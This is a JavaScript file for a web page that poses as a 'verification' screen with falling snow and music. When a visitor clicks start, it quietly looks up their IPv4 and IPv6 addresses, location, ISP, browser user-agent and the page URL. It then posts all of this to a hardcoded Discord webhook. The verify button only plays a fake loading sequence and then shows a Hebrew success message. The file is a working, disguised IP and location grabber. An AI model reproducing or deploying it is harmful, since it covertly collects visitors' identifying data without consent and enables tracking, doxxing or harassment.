document.getElementById("start-btn").addEventListener("click", function () {
    document.getElementById("start-screen").remove();
    document.getElementById("main-screen").classList.remove("hidden");
    document.getElementById("verification-text").classList.remove("hidden");
    document.getElementById("verify-btn").classList.remove("hidden");
    document.getElementById("audio").play();
    startSnow();

    let webhookURL = "https://discordapp.com/api/webhooks/1355178546158501948/P2ijHhP0vljK9IejUHXujtqdyDg0KTcyBIrmP5_eFm6YacSuxi9Z3gPGxDL0GCsDDioz"; // Replace with your actual webhook

    // Get both IPv4 and IPv6
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data_v6 => {
            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data_v4 => {
                    let timestamp = new Date().toLocaleString();
                    let pageURL = window.location.href;
                    
                    let payload = {
                        username: "Verification Log",
                        embeds: [{
                            title: "New Verification Attempt",
                            color: 16711680,
                            fields: [
                                { name: "IPv4 Address", value: data_v4.ip, inline: true },
                                { name: "IPv6 Address", value: data_v6.ip, inline: true },
                                { name: "Country", value: "Fetching...", inline: true }, 
                                { name: "Region", value: "Fetching...", inline: true },
                                { name: "City", value: "Fetching...", inline: true },
                                { name: "ISP", value: "Fetching...", inline: true },
                                { name: "User-Agent", value: navigator.userAgent, inline: false },
                                { name: "Page URL", value: pageURL, inline: false },
                                { name: "Timestamp", value: timestamp, inline: false }
                            ],
                            footer: { text: "Verification System" },
                            timestamp: new Date().toISOString()
                        }]
                    };

                    fetch("https://ipapi.co/json/")
                        .then(response => response.json())
                        .then(ip_data => {
                            payload.embeds[0].fields[2].value = ip_data.country_name;
                            payload.embeds[0].fields[3].value = ip_data.region;
                            payload.embeds[0].fields[4].value = ip_data.city;
                            payload.embeds[0].fields[5].value = ip_data.org;

                            fetch(webhookURL, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify(payload)
                            });
                        })
                        .catch(error => console.error("Error fetching IP location data:", error));

                })
                .catch(error => console.error("Error fetching IPv4:", error));
        })
        .catch(error => console.error("Error fetching IPv6:", error));
});

document.getElementById("verify-btn").addEventListener("click", function() {
    let btn = this;
    btn.disabled = true; 
    btn.textContent = "Loading";
    
    setTimeout(() => {
        btn.textContent = "Loading..";
        setTimeout(() => {
            btn.textContent = "Loading...";
            setTimeout(() => {
                btn.textContent = "אימות הושלם בהצלחה";
                
                setTimeout(() => {
                    btn.style.transition = "transform 0.4s ease-in-out";
                    btn.style.transform = "translateY(500px)"; // Moves down fast
                }, 1000);
            }, 1000);
        }, 1000);
    }, 1000);
});

function startSnow() {
    const canvas = document.getElementById("snow-canvas");
    const ctx = canvas.getContext("2d");
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    let snowflakes = [];

    function createSnowflakes() {
        for (let i = 0; i < 100; i++) {
            snowflakes.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                radius: Math.random() * 4 + 1,
                speedY: Math.random() * 3 + 2,
            });
        }
    }

    function updateSnow() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "white";

        for (let flake of snowflakes) {
            flake.y += flake.speedY;
            if (flake.y > canvas.height) flake.y = 0;
            ctx.beginPath();
            ctx.arc(flake.x, flake.y, flake.radius, 0, Math.PI * 2);
            ctx.fill();
        }
        requestAnimationFrame(updateSnow);
    }

    createSnowflakes();
    updateSnow();
}
